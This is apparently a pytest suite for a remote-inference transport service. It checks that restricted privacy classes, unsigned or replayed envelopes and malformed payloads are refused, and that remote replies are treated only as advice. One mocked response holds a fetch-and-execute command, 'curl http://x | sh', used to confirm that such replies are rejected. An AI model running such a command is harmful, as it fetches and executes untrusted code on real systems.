"""The fourth refusal, driven with the other three switched off (#98).

`routing`, `sanitizer` and `remote_trust` each refuse a class that may not
leave this node. The transport is the **fourth**, and the reason it exists is
that the other three are three pieces of code, each of which can be edited by
somebody who has read only one of them.

The instant before a byte leaves is the last place a mistake is still a
mistake rather than a disclosure. So the tests below do not check that "the
system" refuses `P2` -- that would pass on the strength of the other three.
They call this service **directly**, with nothing else in the path, and check
that it refuses on its own evidence.

Nothing here contacts anything. There is no provider, no endpoint, no
credential and no inference; the signing key is a fixed package-owned test
seed used nowhere else.
"""

from __future__ import annotations

import ast
import base64
import hashlib
import json
import sys
from pathlib import Path

import pytest
from nacl import signing as nacl_signing

REPO_ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(REPO_ROOT / "runtime" / "src"))

from azazel_nexus.activation import (  # noqa: E402
    ARTIFACT_TRANSPORT,
    CORE_UNITS,
    LOCAL_MODEL_PROVIDER,
    REMOTE_INFERENCE_TRANSPORT,
)
from azazel_nexus.provider_registry import (  # noqa: E402
    ProviderRecord,
    ProviderRegistry,
)
from azazel_nexus.remote_envelope import (  # noqa: E402
    ENVELOPE_DOMAIN,
    NonceLedger,
    envelope_payload,
)
from azazel_nexus.sanitizer import NEVER_REMOTE, PrivacyClass  # noqa: E402
from azazel_nexus_runtime import mio_remoted  # noqa: E402
from azazel_nexus_runtime.hardening import PROFILES, SYSTEM_ACCOUNTS  # noqa: E402
from azazel_nexus_runtime.inference_egress import (  # noqa: E402
    EgressReport,
    TransportOutcome,
)
from azazel_nexus_runtime.principal import PrincipalClass  # noqa: E402
from azazel_nexus_runtime.protocol import ArgumentKind  # noqa: E402

UNIT = "azazel-mio-remoted.service"
MODULE = REPO_ROOT / "runtime" / "src" / "azazel_nexus_runtime" / "mio_remoted.py"

_SEED = b"\x41" * 32
NOW = "2026-09-21T12:00:00Z"
LATER = "2026-09-21T13:00:00Z"
PROVIDER = "vendor-advisory"
REVISION = 3
FRAME = json.dumps({"observed": "scan"}, sort_keys=True).encode()


def _key() -> nacl_signing.SigningKey:
    return nacl_signing.SigningKey(_SEED)


def _public() -> bytes:
    return bytes(_key().verify_key)


def _seal(
    *,
    frame: bytes = FRAME,
    privacy_class: PrivacyClass = PrivacyClass.P1_SANITIZED,
    provider_id: str = PROVIDER,
    nonce: str = "n" * 48,
    policy_revision: int = REVISION,
) -> bytes:
    payload = envelope_payload(
        content_digest="sha256:" + hashlib.sha256(frame).hexdigest(),
        privacy_class=privacy_class,
        policy_version="2026-09-01",
        policy_revision=policy_revision,
        provider_id=provider_id,
        nonce=nonce,
        expires_at=LATER,
        frame_bytes=len(frame),
    )
    return bytes(_key().sign(ENVELOPE_DOMAIN + payload).signature) + payload


def _record(**overrides) -> ProviderRecord:
    fields = dict(
        provider_id=PROVIDER,
        host="advisory.example.test",
        port=443,
        path_template="/v1/{model}/advise",
        certificate_pin="sha256:" + "0" * 64,
        client_identity="node-advisory-client",
        model_id="advisor",
        max_request_bytes=4096,
        max_response_bytes=8192,
        deadline_seconds=10,
        allowed_privacy_classes=(PrivacyClass.P0_PUBLIC, PrivacyClass.P1_SANITIZED),
    )
    fields.update(overrides)
    return ProviderRecord(**fields)


def _registry(record: ProviderRecord = None) -> ProviderRegistry:
    record = record or _record()
    return ProviderRegistry(
        version=1,
        commissioning_digest="sha256:" + "0" * 64,
        records={record.provider_id: record},
        signer="provider-1",
    )


class Request:
    def __init__(self, *, frame: bytes, envelope: bytes, provider_id=PROVIDER):
        self.arguments = {"provider_id": provider_id, "request_id": "r1"}
        self.payload = {
            "frame": base64.b64encode(frame).decode(),
            "envelope": base64.b64encode(envelope).decode(),
        }


def _service(**overrides) -> mio_remoted.RemoteInferenceService:
    fields = dict(
        registry=_registry(),
        sanitizer_keys={"sanitizer-1": _public()},
        policy_revision=REVISION,
        nonces=NonceLedger(),
        transport=None,
        clock=lambda: NOW,
    )
    fields.update(overrides)
    return mio_remoted.RemoteInferenceService(**fields)


def _answering_transport(body: bytes):
    def transport(*, record, frame, path):
        return (
            EgressReport(TransportOutcome.RECEIVED, len(body), 200, "ok"),
            body,
        )

    return transport


# == the fourth refusal ===================================================


@pytest.mark.parametrize("never", sorted(NEVER_REMOTE, key=lambda c: c.value))
def test_the_envelope_layer_refuses_a_never_remote_class(never):
    """The first of the two refusals inside this service. Not the one the
    issue asks for -- that is below -- but it must hold on its own too."""

    sent = []

    def transport(*, record, frame, path):
        sent.append(frame)
        return EgressReport(TransportOutcome.RECEIVED, 0, 200, "ok"), b"{}"

    reply = _service(transport=transport).handle(
        Request(frame=FRAME, envelope=_seal(privacy_class=never))
    )
    assert sent == []
    assert reply["refusal"] == "class_not_remote_eligible"


@pytest.mark.parametrize("never", sorted(NEVER_REMOTE, key=lambda c: c.value))
def test_the_transport_refuses_on_its_own_evidence_with_every_other_check_off(
    never, monkeypatch
):
    """**The requirement of this issue**, and the reason it is not the test
    above.

    `routing` is not in this call. `sanitizer` is not in this call.
    `remote_trust` is not in this call. And the envelope layer's own class
    check is **switched off here on purpose**, because a test that left it on
    would pass on its strength and report a guarantee this service does not
    have.

    What is left is the service's own reading of the signed class, at the
    last point where a mistake is still a mistake rather than a disclosure.
    """

    # Disable the envelope layer's class check, the way an edit by somebody
    # who had read only that module would.
    monkeypatch.setattr("azazel_nexus.remote_envelope.NEVER_REMOTE", frozenset())
    monkeypatch.setattr(
        "azazel_nexus.remote_envelope.REMOTE_ELIGIBLE", frozenset(PrivacyClass)
    )

    # It really is off: the envelope now opens with a never-remote class.
    from azazel_nexus.remote_envelope import open_envelope

    opened = open_envelope(
        _seal(privacy_class=never),
        frame=FRAME,
        sanitizer_keys={"sanitizer-1": _public()},
        provider_id=PROVIDER,
        policy_revision=REVISION,
        now=NOW,
        nonces=NonceLedger(),
    )
    assert opened.privacy_class is never, (
        "the check was not actually disabled, so what follows would prove "
        "nothing"
    )

    # And the provider record's check is bypassed too, so nothing but this
    # service's own refusal is left standing.
    sent = []

    def transport(*, record, frame, path):
        sent.append(frame)
        return EgressReport(TransportOutcome.RECEIVED, 0, 200, "ok"), b"{}"

    record = _record()
    object.__setattr__(record, "allowed_privacy_classes", (never,))
    service = _service(registry=_registry(record), transport=transport)

    reply = service.handle(Request(frame=FRAME, envelope=_seal(privacy_class=never)))

    assert sent == [], "a frame left this node with every other refusal disabled"
    assert reply["outcome"] == "not_sent"
    assert reply["refusal"] == "class_not_remote_eligible"


def test_a_caller_cannot_state_a_class_at_all():
    """There is no argument through which one could arrive, and the payload
    contract has exactly two keys."""

    names = [a.name for a in mio_remoted.INFER_VERB.arguments]
    assert names == ["provider_id", "request_id"]
    assert "privacy_class" not in names

    with pytest.raises(mio_remoted.PayloadRefused):
        mio_remoted.read_payload(
            {"frame": "AAAA", "envelope": "AAAA", "privacy_class": "P0-public"}
        )


def test_a_payload_whose_base64_is_lenient_is_refused():
    """Found by mutation: `validate=True` was untested, and my first attempt
    at testing it did not discriminate either -- both inputs raised in both
    modes, so removing the flag still left the suite green.

    The discriminating case is base64 that a lenient decoder accepts by
    **silently discarding** a character it does not recognise. It then
    decodes to something, and that something is not what the sender wrote --
    so the bytes the envelope was checked against are not the bytes that go
    out, and no check appears to have failed.
    """

    # It really is the discriminating case: lenient decoding succeeds.
    assert base64.b64decode("QUJD\nRA==") == b"ABCD"

    with pytest.raises(mio_remoted.PayloadRefused) as caught:
        mio_remoted.read_payload({"frame": "QUJD\nRA==", "envelope": "AAAA"})
    assert "base64" in str(caught.value)

    with pytest.raises(mio_remoted.PayloadRefused):
        mio_remoted.read_payload({"frame": "AAAA", "envelope": "QU JDRA=="})

    # And well-formed base64 still decodes, so the refusals above are
    # refusals rather than a reader that never works.
    frame, envelope = mio_remoted.read_payload(
        {"frame": "QUJDRA==", "envelope": "QUJDRA=="}
    )
    assert frame == envelope == b"ABCD"


def test_a_payload_that_is_not_two_base64_strings_is_refused():
    for payload in (
        {"frame": "AAAA"},
        {"envelope": "AAAA"},
        {"frame": 1, "envelope": "AAAA"},
        {"frame": "AAAA", "envelope": None},
        "not an object",
    ):
        with pytest.raises(mio_remoted.PayloadRefused):
            mio_remoted.read_payload(payload)


def test_an_unsigned_frame_is_not_sent_however_well_formed():
    """Un-sanitised P1 has no envelope, and no envelope means no send. The
    transport accepts sanitisation proof, never a caller's word for it."""

    sent = []

    def transport(*, record, frame, path):
        sent.append(frame)
        return EgressReport(TransportOutcome.RECEIVED, 0, 200, "ok"), b"{}"

    service = _service(transport=transport, sanitizer_keys={})
    reply = service.handle(Request(frame=FRAME, envelope=_seal()))
    assert sent == []
    assert reply["refusal"] == "unsigned"


def test_a_frame_swapped_after_sealing_is_not_sent():
    sent = []

    def transport(*, record, frame, path):
        sent.append(frame)
        return EgressReport(TransportOutcome.RECEIVED, 0, 200, "ok"), b"{}"

    service = _service(transport=transport)
    reply = service.handle(
        Request(frame=b'{"observed":"everything"}', envelope=_seal())
    )
    assert sent == []
    assert reply["refusal"] == "content_mismatch"


def test_an_envelope_is_spent_once_even_with_a_transport_wired():
    service = _service(transport=_answering_transport(b'{"advice":"noted"}'))
    first = service.handle(Request(frame=FRAME, envelope=_seal()))
    second = service.handle(Request(frame=FRAME, envelope=_seal()))
    assert first["outcome"] == "advisory"
    assert second["refusal"] == "replayed"


# == the provider comes from the signed registry only =====================


def test_an_uncommissioned_provider_resolves_to_nothing():
    service = _service(registry=None, transport=_answering_transport(b"{}"))
    reply = service.handle(Request(frame=FRAME, envelope=_seal()))
    assert reply["refusal"] == "no_provider_commissioned"


def test_a_provider_not_commissioned_for_the_class_is_refused():
    record = _record(allowed_privacy_classes=(PrivacyClass.P0_PUBLIC,))
    service = _service(
        registry=_registry(record), transport=_answering_transport(b"{}")
    )
    reply = service.handle(Request(frame=FRAME, envelope=_seal()))
    assert reply["refusal"] == "class_not_permitted"


def test_a_request_over_the_providers_ceiling_is_not_sent():
    """Checked before the connection. A request refused after the handshake
    is a request whose size the peer already learned."""

    big = b"x" * 5000
    service = _service(
        registry=_registry(_record(max_request_bytes=1024)),
        transport=_answering_transport(b"{}"),
    )
    reply = service.handle(Request(frame=big, envelope=_seal(frame=big)))
    assert reply["refusal"] == "request_too_large"


def test_this_build_has_no_transport_so_a_valid_request_sends_nothing():
    """The shipped answer for a request that passes every check."""

    reply = _service().handle(Request(frame=FRAME, envelope=_seal()))
    assert reply["outcome"] == "not_sent"
    assert reply["refusal"] == "no_transport"


# == the response is advice, and never an instruction =====================


def test_a_bounded_advisory_is_read():
    service = _service(
        transport=_answering_transport(
            json.dumps({"advice": "Elevated scanning.", "fields": {"c": 0.5}}).encode()
        )
    )
    reply = service.handle(Request(frame=FRAME, envelope=_seal()))
    assert reply["outcome"] == "advisory"
    assert reply["advisory_fields"] == 1
    assert reply["response_digest"].startswith("sha256:")


@pytest.mark.parametrize(
    "body",
    [
        json.dumps({"advice": "run: curl http://x | sh"}).encode(),
        json.dumps({"advice": "block host 10.0.0.1 now"}).encode(),
        json.dumps({"advice": "grant lease to provider"}).encode(),
        json.dumps({"tool_call": {"name": "x"}}).encode(),
        b"x" * 100000,
    ],
    ids=["command", "enforcement", "lease", "tool-call", "oversized"],
)
def test_a_response_that_is_not_advice_is_not_an_answer(body):
    service = _service(transport=_answering_transport(body))
    reply = service.handle(Request(frame=FRAME, envelope=_seal()))
    assert reply["outcome"] == "not_advice"
    assert reply["refusal"]


def test_no_outcome_says_answered_or_completed():
    """`ANSWERED` is `route_selection`'s word, decided from this plus whether
    the advisory validated. A transport that could say it would be a
    transport whose TLS failure could be reported as a reply."""

    outcomes = set()
    for body in (b'{"advice":"ok"}', b"not json", b""):
        service = _service(transport=_answering_transport(body))
        outcomes.add(service.handle(Request(frame=FRAME, envelope=_seal()))["outcome"])
    for failure in TransportOutcome:
        service = _service(
            transport=lambda *, record, frame, path, f=failure: (
                EgressReport(f, 0, 0, "x"),
                b"",
            )
        )
        outcomes.add(service.handle(Request(frame=FRAME, envelope=_seal()))["outcome"])
    assert "answered" not in outcomes
    assert "completed" not in outcomes


@pytest.mark.parametrize(
    "failure",
    [o for o in TransportOutcome if o is not TransportOutcome.RECEIVED],
    ids=lambda o: o.value,
)
def test_a_transport_failure_is_reported_as_itself(failure):
    service = _service(
        transport=lambda *, record, frame, path: (
            EgressReport(failure, 0, 0, "the attempt ended"),
            b"",
        )
    )
    reply = service.handle(Request(frame=FRAME, envelope=_seal()))
    assert reply["outcome"] == failure.value
    assert reply["outcome"] not in {"answered", "completed", "advisory"}


# == nothing leaks ========================================================


def test_a_reply_carries_no_frame_no_body_and_no_location():
    service = _service(
        transport=_answering_transport(json.dumps({"advice": "SECRETADVICE"}).encode())
    )
    rendered = repr(service.handle(Request(frame=FRAME, envelope=_seal())))
    for leak in ("observed", "scan", "SECRETADVICE", "advisory.example.test", "/v1/"):
        assert leak not in rendered, f"the reply carries {leak!r}"


def test_the_executable_takes_no_arguments():
    with pytest.raises(SystemExit) as caught:
        mio_remoted.main(["--endpoint", "https://x/y", "--token", "t"])
    assert "takes no arguments" in str(caught.value)


def test_it_refuses_to_start_with_nothing_commissioned():
    with pytest.raises(SystemExit) as caught:
        mio_remoted.main([])
    assert "no provider commissioned" in str(caught.value)


def test_the_service_module_opens_nothing_itself():
    """The socket lives in the one exempt module. Keeping them apart means
    the part that parses a request cannot also be the part that connects."""

    tree = ast.parse(MODULE.read_text(encoding="utf-8"))
    imported = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            imported.update(a.name.split(".")[0] for a in node.names)
        elif isinstance(node, ast.ImportFrom) and node.module and node.level == 0:
            imported.add(node.module.split(".")[0])
    assert imported & {"ssl", "socket", "subprocess", "os"} == set()


def test_there_is_no_retry_around_the_send():
    """The router decides fallback once. A retry here would spend it silently
    and report the slower result as though the first attempt went that way."""

    calls = []
    service = _service(
        transport=lambda *, record, frame, path: (
            calls.append(1),
            (EgressReport(TransportOutcome.TIMED_OUT, 0, 0, "x"), b""),
        )[1]
    )
    service.handle(Request(frame=FRAME, envelope=_seal()))
    assert calls == [1]

    for node in ast.walk(ast.parse(MODULE.read_text(encoding="utf-8"))):
        if isinstance(node, (ast.For, ast.While)):
            for inner in ast.walk(node):
                if isinstance(inner, ast.Call):
                    name = (
                        inner.func.attr
                        if isinstance(inner.func, ast.Attribute)
                        else getattr(inner.func, "id", "")
                    )
                    assert name not in {"_transport", "send_inference", "transport"}, (
                        f"line {inner.lineno}: a send inside a loop"
                    )


# == the service boundary =================================================


def _profile(unit: str):
    return next(p for p in PROFILES if p.unit == unit)


def test_it_has_its_own_account_socket_directory_and_registry():
    profile = _profile(UNIT)
    assert profile.account == "azremote"
    assert "azremote" in SYSTEM_ACCOUNTS
    assert profile.runtime_directory == "azazel/remote"
    assert mio_remoted.SOCKET_NAME == "remote"
    assert str(mio_remoted.PROVIDER_REGISTRY_PATH) == (
        "/var/lib/azazel/remote/providers.signed"
    )


def test_it_shares_nothing_with_the_fetcher_or_the_local_runtime():
    """Pulling a file, running a program, and pushing a report are three acts
    with three blast radii."""

    remote = _profile(UNIT)
    fetch = _profile("azazel-model-fetchd.service")
    local = _profile("azazel-mio-locald.service")

    accounts = {remote.account, fetch.account, local.account}
    assert len(accounts) == 3
    sockets = {mio_remoted.SOCKET_NAME, "fetch", "mio"}
    assert len(sockets) == 3
    directories = {
        remote.runtime_directory, fetch.runtime_directory, local.runtime_directory
    }
    assert len(directories) == 3

    for other in (fetch, local):
        shared = set(remote.read_write_paths) & set(other.read_write_paths)
        assert shared == {"/var/lib/azazel/run"}, (
            "the socket directory is shared; the state directories must not be"
        )


def test_each_holds_exactly_one_network_or_execution_role():
    assert _profile(UNIT).is_inference_transport
    assert not _profile(UNIT).is_artifact_fetcher
    assert not _profile(UNIT).is_model_host
    assert sum(p.is_inference_transport for p in PROFILES) == 1


def test_the_three_capabilities_are_separate(monkeypatch):
    """Wiring one must not be read as having wired another."""

    import azazel_nexus_runtime.activated as activated

    assert activated.wired_capabilities() == frozenset()

    monkeypatch.setattr(activated, "TRANSPORT", lambda **k: None)
    assert activated.wired_capabilities() == frozenset({REMOTE_INFERENCE_TRANSPORT})
    assert ARTIFACT_TRANSPORT not in activated.wired_capabilities()
    assert LOCAL_MODEL_PROVIDER not in activated.wired_capabilities()


def test_the_unit_is_withheld_while_nothing_is_commissioned():
    definition = next(d for d in CORE_UNITS if d.name == UNIT)
    assert definition.wiring == REMOTE_INFERENCE_TRANSPORT


def test_a_payload_verb_that_names_no_contract_cannot_be_built():
    """Found by mutation: the requirement was stated and never driven.

    A boolean alone would let a third payload verb appear with nothing
    checking its object, and "the payload is validated" would still read as
    true of the type.
    """

    from azazel_nexus_runtime.protocol import Verb

    with pytest.raises(ValueError) as caught:
        Verb(
            name="x.y",
            admits=frozenset({PrincipalClass.ROOT}),
            accepts_payload=True,
        )
    assert "validates it" in str(caught.value)

    with pytest.raises(ValueError) as caught:
        Verb(
            name="x.y",
            admits=frozenset({PrincipalClass.ROOT}),
            payload_contract="something",
        )
    assert "accepts no" in str(caught.value)


def test_every_payload_verb_in_the_product_names_its_contract():
    """Two verbs accept one. A third appearing without a named validator is
    a failure here rather than a sentence that went stale."""

    from azazel_nexus_runtime.auditd import VERBS as AUDIT_VERBS

    accepting = [
        v for v in (*AUDIT_VERBS, mio_remoted.INFER_VERB) if v.accepts_payload
    ]
    assert sorted(v.name for v in accepting) == [
        "audit.append",
        "audit.bootstrap.append",
        "remote.infer",
    ]
    for verb in accepting:
        assert verb.payload_contract.strip(), verb.name


def test_the_verb_takes_two_identifiers_and_an_operator_may_not_call_it():
    verb = mio_remoted.INFER_VERB
    assert {a.kind for a in verb.arguments} == {ArgumentKind.IDENTIFIER}
    assert verb.admits == frozenset({PrincipalClass.ROOT, PrincipalClass.SERVICE})
    assert PrincipalClass.OPERATOR not in verb.admits
    assert verb.payload_contract.strip(), "a payload with nothing named to check it"


# == Edge authority is unchanged in every remote state ====================
#
# The doctrine: the deterministic arbiter from Azazel-Edge holds the final
# authority to decide and to enforce, and `FULL -> LITE -> CORE` is a
# capability state, never an authority state.
#
# Remote inference is the component where that is easiest to erode, because
# what comes back is an answer from something that looks authoritative. So
# the states are enumerated -- including the ones where a provider answered
# well -- and the same properties are asserted across all of them. A test
# that drove one state would report an invariant it had checked once.


REMOTE_STATES = (
    "nothing_commissioned",
    "envelope_unsigned",
    "envelope_replayed",
    "envelope_expired_policy",
    "class_refused",
    "provider_unknown",
    "request_too_large",
    "tls_failed",
    "timed_out",
    "cancelled_mid_read",
    "response_not_advice",
    "advisory_received",
)


def _drive(state: str):
    """Put the service into `state` and return its reply. Contacts nothing."""

    if state == "nothing_commissioned":
        return _service(registry=None).handle(
            Request(frame=FRAME, envelope=_seal())
        )
    if state == "envelope_unsigned":
        return _service(sanitizer_keys={}).handle(
            Request(frame=FRAME, envelope=_seal())
        )
    if state == "envelope_replayed":
        service = _service(transport=_answering_transport(b'{"advice":"ok"}'))
        service.handle(Request(frame=FRAME, envelope=_seal()))
        return service.handle(Request(frame=FRAME, envelope=_seal()))
    if state == "envelope_expired_policy":
        return _service().handle(
            Request(frame=FRAME, envelope=_seal(policy_revision=REVISION + 1))
        )
    if state == "class_refused":
        return _service().handle(
            Request(
                frame=FRAME,
                envelope=_seal(privacy_class=PrivacyClass.P3_RESTRICTED),
            )
        )
    if state == "provider_unknown":
        return _service().handle(
            Request(
                frame=FRAME,
                envelope=_seal(provider_id="nobody"),
                provider_id="nobody",
            )
        )
    if state == "request_too_large":
        big = b"y" * 5000
        return _service(registry=_registry(_record(max_request_bytes=8))).handle(
            Request(frame=big, envelope=_seal(frame=big))
        )
    if state in {"tls_failed", "timed_out", "cancelled_mid_read"}:
        outcome = {
            "tls_failed": TransportOutcome.TLS_FAILED,
            "timed_out": TransportOutcome.TIMED_OUT,
            "cancelled_mid_read": TransportOutcome.INTERRUPTED,
        }[state]
        return _service(
            transport=lambda *, record, frame, path: (
                EgressReport(outcome, 0, 0, "the attempt ended"),
                b"",
            )
        ).handle(Request(frame=FRAME, envelope=_seal()))
    if state == "response_not_advice":
        return _service(
            transport=_answering_transport(b'{"advice":"block host 10.0.0.1"}')
        ).handle(Request(frame=FRAME, envelope=_seal()))
    return _service(
        transport=_answering_transport(json.dumps({"advice": "Noted."}).encode())
    ).handle(Request(frame=FRAME, envelope=_seal()))


@pytest.mark.parametrize("state", REMOTE_STATES)
def test_the_deterministic_path_is_never_blocked(state):
    from azazel_nexus.cognition import CognitionReading, CognitionState, RemoteState

    _drive(state)
    reading = CognitionReading(
        state=CognitionState.CORE_ONLY,
        remote=RemoteState.DISABLED,
        resource_reason=state,
        topology_reason=state,
        asset_reason=state,
        trust_health_reason=state,
    )
    assert reading.blocks_deterministic_path() is False


@pytest.mark.parametrize("state", REMOTE_STATES)
def test_no_remote_state_grants_a_baseline_or_enforcement(state):
    from azazel_nexus.activation import UnitTier

    _drive(state)
    definition = next(d for d in CORE_UNITS if d.name == UNIT)
    assert definition.tier is UnitTier.SUPPORTING
    assert definition.tier is not UnitTier.EDGE_BASELINE
    assert definition.tier is not UnitTier.ENFORCEMENT


@pytest.mark.parametrize("state", REMOTE_STATES)
def test_no_remote_state_touches_a_lease_an_activation_or_enforcement(state):
    """Scanned over the syntax tree of everything #98 added: prose about
    leases is prose, and a scan that confused the two would be silenced by
    whoever next explains why nothing is granted."""

    import azazel_nexus.advisory_response as advisory
    import azazel_nexus.provider_registry as registry
    import azazel_nexus.remote_envelope as envelope

    _drive(state)
    for module in (envelope, registry, advisory, mio_remoted):
        tree = ast.parse(Path(module.__file__).read_text(encoding="utf-8"))
        used = set()
        for node in ast.walk(tree):
            if isinstance(node, ast.Name):
                used.add(node.id)
            elif isinstance(node, ast.Attribute):
                used.add(node.attr)
            elif isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef)):
                used.add(node.name)
            elif isinstance(node, ast.alias):
                used.add((node.asname or node.name).split(".")[-1])
        offenders = sorted(
            name
            for name in used
            if any(
                token in name.lower()
                for token in ("lease", "unmask", "enforce", "activationcontroller")
            )
        )
        assert offenders == [], (
            f"{module.__name__} uses {offenders}; a remote answer is advice, "
            "and advice is never authority"
        )

    # And the scan can fail.
    sample = {
        n.id for n in ast.walk(ast.parse("extend_lease(x)")) if isinstance(n, ast.Name)
    }
    assert any("lease" in name.lower() for name in sample)


@pytest.mark.parametrize("state", REMOTE_STATES)
def test_an_advisory_changes_nothing_the_node_decides(state):
    """Including the state where a provider answered well. A node that lost
    every provider decides exactly what it decided before."""

    from azazel_nexus.cognition import CognitionReading, CognitionState, RemoteState

    _drive(state)
    reading = CognitionReading(
        state=CognitionState.CORE_ONLY,
        remote=RemoteState.DISABLED,
        resource_reason="unmeasured",
        topology_reason="unmeasured",
        asset_reason="none",
        trust_health_reason="none",
    )
    assert reading.state is CognitionState.CORE_ONLY
    assert reading.sources_local_cognition is False
    assert reading.remote is RemoteState.DISABLED


def test_the_state_list_covers_a_good_answer_and_the_failures():
    """A list that quietly lost its interesting members still passes."""

    assert "advisory_received" in REMOTE_STATES
    assert {"tls_failed", "envelope_replayed", "class_refused"} <= set(REMOTE_STATES)
    assert len(REMOTE_STATES) == len(set(REMOTE_STATES))


def test_every_state_is_reachable_and_distinct():
    """A state that silently collapsed into another would make the sweep
    above look broader than it is."""

    outcomes = {state: _drive(state)["outcome"] for state in REMOTE_STATES}
    assert outcomes["advisory_received"] == "advisory"
    assert outcomes["response_not_advice"] == "not_advice"
    assert outcomes["tls_failed"] == "tls_failed"
    assert len({o for o in outcomes.values()}) >= 4
